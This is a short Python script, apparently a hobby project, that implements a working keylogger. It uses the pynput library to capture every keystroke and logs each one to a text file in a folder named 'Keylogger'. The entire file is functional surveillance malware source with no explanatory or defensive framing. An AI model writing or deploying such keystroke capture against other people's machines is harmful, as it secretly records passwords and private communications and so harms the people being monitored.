from pynput.keyboard import Key, Listener
import logging

log_directory = r"/Users/shubsharma/Desktop/Python/Keylogger./key.txt"

logging.basicConfig(filename = (log_directory), level = logging.DEBUG)

def on_press(key):
    logging.info(str(key))

with Listener(on_press = on_press) as listener:
    listener.join()
